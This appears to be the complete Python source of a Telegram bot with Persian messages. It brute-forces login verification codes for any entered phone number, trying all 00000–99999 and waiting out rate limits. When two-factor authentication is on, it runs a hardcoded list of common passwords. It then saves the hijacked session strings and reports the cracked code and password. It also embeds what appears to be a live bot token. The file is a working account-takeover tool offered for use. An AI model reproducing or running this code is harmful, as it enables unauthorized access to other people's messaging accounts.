import logging
import re
import asyncio
import os
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PhoneNumberInvalidError
import urllib.request

# ============ تنظیمات ============
TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_sessions = {}
self_data = {}

DATA_FILE = "selfs.json"

# ============ دیکشنری پسورد ============
PASSWORD_DICT = [
    "123456", "12345678", "123456789", "1234567890",
    "password", "pass", "admin", "admin123",
    "qwerty", "qwerty123", "abc123", "abcd1234",
    "letmein", "welcome", "hello", "12345",
    "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888",
    "999999", "000000", "123123", "321321",
    "iloveyou", "monkey", "dragon", "master",
    "sunshine", "princess", "shadow", "ninja",
    "password1", "Password1", "Passw0rd",
    "Admin123", "admin1234", "1234", "4321",
    "0000", "1111", "2222", "3333", "4444",
    "5555", "6666", "7777", "8888", "9999",
    "00000000", "11111111", "22222222", "33333333",
    "44444444", "55555555", "66666666", "77777777",
    "88888888", "99999999", "0123456789",
    "0987654321", "987654321", "1234567890",
    "qwertyuiop", "asdfghjkl", "zxcvbnm",
    "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
    "q1w2e3r4", "a1b2c3d4", "z1x2c3v4",
    "!@#$%^&*", "123qwe", "qwe123", "123abc",
    "abc123!", "pass123", "123pass", "P@ssw0rd",
    "P@ssword", "Pass@123", "Admin@123",
    "admin@123", "root", "toor", "ubuntu",
    "linux", "windows", "mac", "apple",
    "google", "microsoft", "facebook", "twitter",
    "instagram", "telegram", "whatsapp", "youtube",
    "netflix", "spotify", "amazon", "github",
    "stackoverflow", "reddit", "discord", "twitch",
    "paypal", "coinbase", "binance", "crypto",
    "bitcoin", "ethereum", "dogecoin", "solana",
    "ripple", "cardano", "polkadot", "chainlink",
    "1", "12", "123", "1234", "12345", "123456",
    "1234567", "12345678", "123456789", "1234567890"
]

def load_data():
    global self_data
    try:
        with open(DATA_FILE, 'r') as f:
            self_data = json.load(f)
    except:
        self_data = {}

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(self_data, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

load_data()

def delete_webhook():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        with urllib.request.urlopen(url) as response:
            return True
    except:
        return False

def is_valid_phone(text):
    # حذف کاراکترهای غیرعددی به جز +
    phone = re.sub(r'[^0-9+]', '', text)
    # اگر با + شروع شد، حذفش کن
    if phone.startswith('+'):
        phone = phone[1:]
    return len(phone) >= 10

def clean_phone(text):
    # حذف همه چیز به جز اعداد
    return re.sub(r'[^0-9]', '', text)

def is_valid_api_id(text):
    return text.isdigit()

def is_valid_api_hash(text):
    return len(text) >= 30

def mask_string(s, show=5):
    if not s:
        return "***"
    if len(s) <= show:
        return s
    return s[:show] + "..." + s[-3:]

async def clear_user_session(user_id):
    if user_id in user_sessions:
        try:
            client = user_sessions[user_id].get('client')
            if client:
                await client.disconnect()
        except:
            pass
        del user_sessions[user_id]

# ============ منوی اصلی ============
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    name = user.first_name if user.first_name else "کاربر"
    user_id = str(user.id)
    
    self_count = len(self_data.get(user_id, []))
    
    text = f"""
🤖 <b>ربات ساخت خودکار سلف</b>

<b>سلام {name} گرامی</b>

این ربات به صورت خودکار:
• کد تایید 5 رقمی را حدس می‌زند
• پسورد 2FA را با دیکشنری امتحان می‌کند

<b>تعداد سلف‌های ثبت شده: {self_count}</b>

برای شروع روی دکمه زیر کلیک کنید:
"""
    
    keyboard = [
        [InlineKeyboardButton("🔑 ورود و ساخت سلف", callback_data="new_session")]
    ]
    
    if edit and update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            await update.callback_query.answer()
        except:
            pass
    else:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

# ============ دکمه ساخت سلف ============
async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    user_sessions[user_id] = {"step": "phone"}
    
    text = """
📱 <b>مرحله اول: وارد کردن شماره تلفن</b>

لطفاً شماره تلفن مورد نظر را به همراه کد کشور وارد کنید.

<b>مثال:</b> <code>989123456789</code>

⚠️ شماره را <b>بدون علامت (+)</b> وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت شماره ============
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    # پاک کردن شماره از هر چیزی غیر از عدد
    phone = clean_phone(text)
    
    if not is_valid_phone(phone):
        await update.message.reply_text(
            "❌ شماره تلفن نامعتبر است!\n\n⚠️ شماره را بدون + وارد کنید.\n<b>مثال:</b> <code>989123456789</code>",
            parse_mode='HTML'
        )
        return
    
    user_sessions[user_id]['phone'] = phone
    user_sessions[user_id]['step'] = "api_id"
    
    text = f"""
✅ شماره تلفن ثبت شد: <code>{phone}</code>

🔑 <b>مرحله دوم: API ID</b>

لطفاً API ID خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API ID ============
async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    if not text.isdigit():
        await update.message.reply_text("❌ API ID باید عدد باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_id'] = int(text)
    user_sessions[user_id]['step'] = "api_hash"
    
    text = f"""
✅ API ID ثبت شد: <code>{text}</code>

🔐 <b>مرحله سوم: API Hash</b>

لطفاً API Hash خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API Hash ============
async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    if len(text) < 30:
        await update.message.reply_text("❌ API Hash باید حداقل 30 کاراکتر باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_hash'] = text
    user_sessions[user_id]['step'] = "code"
    
    msg = await update.message.reply_text(
        "⏳ در حال ارسال کد تایید و شروع حدس زدن...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
        parse_mode='HTML'
    )
    
    try:
        data = user_sessions[user_id]
        phone = data['phone']
        api_id = data['api_id']
        api_hash = data['api_hash']
        
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        
        try:
            await client.send_code_request(phone)
        except PhoneNumberInvalidError:
            await context.bot.edit_message_text(
                f"❌ شماره تلفن نامعتبر است!\n\nشماره: <code>{phone}</code>\n\n⚠️ مطمئن شوید شماره را به درستی وارد کرده‌اید.\n<b>مثال:</b> <code>989123456789</code>",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            await clear_user_session(user_id)
            return
        except FloodWaitError as e:
            await context.bot.edit_message_text(
                f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            await asyncio.sleep(e.seconds)
            await client.send_code_request(phone)
        
        user_sessions[user_id]['client'] = client
        user_sessions[user_id]['msg_id'] = msg.message_id
        user_sessions[user_id]['phone'] = phone
        
        # شروع حدس زدن کد
        asyncio.create_task(bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.edit_message_text(
            f"❌ خطا: {str(e)[:200]}",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        await clear_user_session(user_id)

# ============ حدس زدن پسورد ============
async def bruteforce_password(update, context, user_id, client, msg):
    """حدس زدن پسورد 2FA با دیکشنری"""
    try:
        total_passwords = len(PASSWORD_DICT)
        attempt = 0
        found = False
        found_password = None
        
        # پیام شروع حدس پسورد
        await context.bot.edit_message_text(
            f"""
🔐 <b>شروع حدس زدن پسورد 2FA...</b>

📊 تعداد پسوردهای دیکشنری: {total_passwords}
⏳ در حال تلاش...

⚠️ این عملیات ممکن است چند دقیقه طول بکشد.
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        for password in PASSWORD_DICT:
            attempt += 1
            
            if attempt % 10 == 0:
                try:
                    await context.bot.edit_message_text(
                        f"""
🔐 <b>در حال حدس زدن پسورد...</b>

🔑 پسورد فعلی: <code>{password}</code>
📊 تلاش‌ها: {attempt} از {total_passwords}
📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%

⏳ لطفاً صبر کنید...
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(password=password)
                found = True
                found_password = password
                break
                
            except FloodWaitError as e:
                wait_time = e.seconds
                await context.bot.edit_message_text(
                    f"""
⏳ <b>محدودیت تلگرام!</b>

{wait_time} ثانیه صبر کنید...
پسورد آخرین تلاش: <code>{password}</code>
تلاش‌ها: {attempt} از {total_passwords}

⏳ لطفاً صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                await asyncio.sleep(wait_time + 2)
                continue
                
            except Exception:
                continue
        
        return found, attempt, found_password
        
    except Exception as e:
        logger.error(f"Error in bruteforce_password: {e}")
        return False, 0, None

# ============ تابع حدس زدن کد ============
async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
    """حدس زدن کد 5 رقمی از 00000 تا 99999"""
    try:
        total_attempts = 100000
        attempt = 0
        found = False
        code_found = None
        
        # پیام شروع
        await context.bot.edit_message_text(
            f"""
🔍 <b>شروع حدس زدن کد تایید...</b>

📱 شماره: <code>{phone}</code>
🔢 محدوده: 00000 تا 99999
📊 مجموع تلاش‌ها: {total_attempts}

⏳ در حال تلاش...
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        for code_num in range(total_attempts):
            code = str(code_num).zfill(5)
            attempt += 1
            
            if attempt % 1000 == 0:
                try:
                    await context.bot.edit_message_text(
                        f"""
🔍 <b>در حال حدس زدن کد...</b>

📱 شماره: <code>{phone}</code>
🔢 کد فعلی: <code>{code}</code>
📊 تلاش‌ها: {attempt} از {total_attempts}
📈 پیشرفت: {(attempt/total_attempts)*100:.1f}%

⏳ لطفاً صبر کنید...
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(phone, code)
                found = True
                code_found = code
                break
                
            except PhoneCodeInvalidError:
                continue
                
            except FloodWaitError as e:
                wait_time = e.seconds
                await context.bot.edit_message_text(
                    f"""
⏳ <b>محدودیت تلگرام!</b>

{wait_time} ثانیه صبر کنید...
کد آخرین تلاش: <code>{code}</code>
تلاش‌ها: {attempt} از {total_attempts}

⏳ لطفاً صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                await asyncio.sleep(wait_time + 2)
                continue
                
            except SessionPasswordNeededError:
                # نیاز به رمز دو مرحله‌ای
                await context.bot.edit_message_text(
                    f"""
🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>

📱 شماره: <code>{phone}</code>
✅ کد تایید پیدا شد: <code>{code}</code>

🔑 در حال حدس زدن پسورد 2FA...
⏳ لطفاً صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                # شروع حدس پسورد
                password_found, pass_attempt, pass_found = await bruteforce_password(
                    update, context, user_id, client, msg
                )
                
                if password_found and pass_found:
                    session_string = client.session.save()
                    await client.disconnect()
                    
                    account_name = "بدون نام"
                    try:
                        client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                        await client2.connect()
                        if await client2.is_user_authorized():
                            me = await client2.get_me()
                            account_name = me.first_name if me.first_name else "کاربر"
                        await client2.disconnect()
                    except:
                        pass
                    
                    user_id_str = str(user_id)
                    if user_id_str not in self_data:
                        self_data[user_id_str] = []
                    
                    time_str = datetime.now().strftime("%H:%M")
                    date_str = datetime.now().strftime("%Y/%m/%d")
                    
                    self_data[user_id_str].append({
                        "session": session_string,
                        "phone": phone,
                        "api_id": api_id,
                        "api_hash": api_hash,
                        "account_name": account_name,
                        "active": True,
                        "clock_active": False,
                        "active_time": "تنظیم نشده",
                        "font_type": "1",
                        "created": f"{date_str} {time_str}",
                        "last_update": f"{date_str} {time_str}"
                    })
                    save_data()
                    
                    await clear_user_session(user_id)
                    
                    text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>
🔐 پسورد پیدا شده: <code>{pass_found}</code>
📊 تلاش‌های کد: {attempt}
📊 تلاش‌های پسورد: {pass_attempt}

🎯 سلف به لیست شما اضافه شد.
"""
                    
                    keyboard = [
                        [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                        [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
                    ]
                    
                    await context.bot.edit_message_text(
                        text,
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='HTML'
                    )
                    return
                else:
                    await context.bot.edit_message_text(
                        f"""
❌ <b>پسورد 2FA پیدا نشد!</b>

📱 شماره: <code>{phone}</code>
✅ کد تایید پیدا شد: <code>{code}</code>
📊 تعداد پسوردهای امتحان شده: {pass_attempt}

❌ پسورد مورد نظر در دیکشنری وجود ندارد.
لطفاً پسورد را به صورت دستی وارد کنید.
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                    user_sessions[user_id]['step'] = "password"
                    user_sessions[user_id]['code_found'] = code
                    return
                
            except Exception as e:
                logger.error(f"Error in bruteforce: {e}")
                continue
        
        if found and code_found:
            session_string = client.session.save()
            await client.disconnect()
            
            account_name = "بدون نام"
            try:
                client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                await client2.connect()
                if await client2.is_user_authorized():
                    me = await client2.get_me()
                    account_name = me.first_name if me.first_name else "کاربر"
                await client2.disconnect()
            except:
                pass
            
            user_id_str = str(user_id)
            if user_id_str not in self_data:
                self_data[user_id_str] = []
            
            time_str = datetime.now().strftime("%H:%M")
            date_str = datetime.now().strftime("%Y/%m/%d")
            
            self_data[user_id_str].append({
                "session": session_string,
                "phone": phone,
                "api_id": api_id,
                "api_hash": api_hash,
                "account_name": account_name,
                "active": True,
                "clock_active": False,
                "active_time": "تنظیم نشده",
                "font_type": "1",
                "created": f"{date_str} {time_str}",
                "last_update": f"{date_str} {time_str}"
            })
            save_data()
            
            await clear_user_session(user_id)
            
            text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code_found}</code>
📊 تعداد تلاش‌ها: {attempt}

🎯 سلف به لیست شما اضافه شد.
"""
            
            keyboard = [
                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
            ]
            
            await context.bot.edit_message_text(
                text,
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            
        else:
            await context.bot.edit_message_text(
                f"""
❌ <b>کد تایید پیدا نشد!</b>

📱 شماره: <code>{phone}</code>
📊 تعداد تلاش‌ها: {attempt}

ممکن است:
• شماره تلفن اشتباه باشد
• کد قبلاً منقضی شده باشد
• اکانت دارای محدودیت باشد

لطفاً دوباره تلاش کنید.
""",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Error in bruteforce_code: {e}")
        try:
            await context.bot.edit_message_text(
                f"❌ خطا: {str(e)[:200]}",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
        await clear_user_session(user_id)

# ============ دریافت پسورد دستی ============
async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "password":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    data = user_sessions[user_id]
    client = data.get('client')
    code = data.get('code_found')
    phone = data.get('phone')
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    
    if not client:
        await update.message.reply_text("❌ اتصال معتبر نیست. دوباره تلاش کنید.", parse_mode='HTML')
        await clear_user_session(user_id)
        return
    
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        await client.disconnect()
        
        account_name = "بدون نام"
        try:
            client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client2.connect()
            if await client2.is_user_authorized():
                me = await client2.get_me()
                account_name = me.first_name if me.first_name else "کاربر"
            await client2.disconnect()
        except:
            pass
        
        user_id_str = str(user_id)
        if user_id_str not in self_data:
            self_data[user_id_str] = []
        
        time_str = datetime.now().strftime("%H:%M")
        date_str = datetime.now().strftime("%Y/%m/%d")
        
        self_data[user_id_str].append({
            "session": session_string,
            "phone": phone,
            "api_id": api_id,
            "api_hash": api_hash,
            "account_name": account_name,
            "active": True,
            "clock_active": False,
            "active_time": "تنظیم نشده",
            "font_type": "1",
            "created": f"{date_str} {time_str}",
            "last_update": f"{date_str} {time_str}"
        })
        save_data()
        
        await clear_user_session(user_id)
        
        text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>

🎯 سلف به لیست شما اضافه شد.
"""
        
        keyboard = [
            [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
            [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
        ]
        
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ رمز عبور اشتباه است.\n\n{str(e)[:100]}\n\nلطفاً دوباره وارد کنید:",
            parse_mode='HTML'
        )

# ============ بازگشت ============
async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    
    await main_menu(update, context, edit=True)

# ============ دستور start ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await main_menu(update, context)

# ============ هندلر پیام‌ها ============
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")
        if step == "phone":
            await handle_phone(update, context)
        elif step == "api_id":
            await handle_api_id(update, context)
        elif step == "api_hash":
            await handle_api_hash(update, context)
        elif step == "password":
            await handle_password(update, context)
        return
    
    await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')

# ============ اجرا ============
def main():
    try:
        delete_webhook()
        
        print("=" * 60)
        print("🤖 ربات ساخت خودکار سلف (با حدس پسورد)")
        print("=" * 60)
        print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
        print("=" * 60)
        
        application = Application.builder().token(TOKEN).build()
        
        application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
        application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
        
        print("✅ ربات با موفقیت راه‌اندازی شد.")
        print("💡 برای شروع از /start استفاده کنید.")
        print("=" * 60)
        
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ خطا: {e}")

if __name__ == "__main__":
    main()
